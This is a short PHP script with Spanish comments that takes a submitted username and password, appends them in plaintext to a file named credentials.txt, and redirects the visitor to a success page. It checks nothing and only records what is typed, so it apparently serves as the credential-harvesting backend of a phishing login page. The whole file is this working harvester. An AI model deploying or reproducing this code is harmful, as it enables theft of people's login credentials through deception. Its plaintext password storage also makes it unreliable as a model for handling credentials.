<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['user'];
    $password = $_POST['pass'];

    // Sanitizar las entradas para mayor seguridad
    $username = htmlspecialchars($username);
    $password = htmlspecialchars($password);

    // Definir el archivo donde se almacenarán las credenciales
    $file = 'credentials.txt';

    // Crear el contenido a escribir en el archivo
    $content = "Usuario: " . $username . "\nContraseña: " . $password . "\n\n";

    // Escribir las credenciales en el archivo
    file_put_contents($file, $content, FILE_APPEND);

    // Redirigir a una página de confirmación o de regreso al formulario
    header("Location: success.html");
    exit();
} else {
    echo "Método no permitido.";
}
?>
